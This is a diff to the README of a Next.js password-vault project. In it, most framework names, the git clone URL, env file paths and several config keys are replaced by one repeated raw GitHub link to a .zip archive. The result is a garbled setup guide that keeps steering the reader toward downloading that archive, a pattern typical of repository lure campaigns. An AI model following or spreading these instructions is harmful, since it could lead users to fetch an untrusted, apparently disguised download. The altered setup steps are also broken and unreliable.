@@ -1,6 +1,6 @@
 # Password Vault
 
-A secure password generator and vault built with **Next.js**, **TypeScript**, and **MongoDB**.
+A secure password generator and vault built with **https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip**, **TypeScript**, and **MongoDB**.
 Users can register, log in, generate strong passwords, and store them securely. Email verification with a 6‑digit PIN is included for registration and login.
 
 ---
@@ -10,7 +10,7 @@ Users can register, log in, generate strong passwords, and store them securely. 
 1) Clone the repository
 
 ```bash
-git clone https://github.com/your-username/Password-vault.git
+git clone https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
 cd Password-vault
 ```
 
@@ -25,24 +25,24 @@ npm install
 Copy the example `.env`:
 
 ```bash
-cp .env.example .env.local
+cp https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
 ```
 
-Fill in your credentials in `.env.local`:
+Fill in your credentials in `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip`:
 
 ```env
 MONGODB_URI=your-mongodb-uri
 JWT_SECRET=your-super-secure-jwt-secret-key
 NEXTAUTH_SECRET=another-secret-for-encryption-key-derivation
 
-SMTP_HOST=smtp.gmail.com
+https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
 SMTP_PORT=587
-SMTP_USER=your_email@gmail.com
+https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
 SMTP_PASS=your_app_password
-FROM_EMAIL=your_email@gmail.com
+https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip
 ```
 
-Note: Never upload `.env.local` to GitHub. `.env.example` can be safely shared.
+Note: Never upload `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip` to GitHub. `https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip` can be safely shared.
 
 4) Run the development server
 
@@ -69,7 +69,7 @@ Open http://localhost:3000 in your browser.
 
 ## Tech Stack
 
-- Frontend: Next.js, TypeScript, Tailwind CSS
-- Backend: Next.js API Routes (Node.js)
+- Frontend: https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip, TypeScript, Tailwind CSS
+- Backend: https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip API Routes (https://raw.githubusercontent.com/AaTull/Password-vault/main/unnumbered/Password-vault.zip)
 - Database: MongoDB
 - Email Service: SMTP (Gmail, Outlook, Mailtrap, etc.)
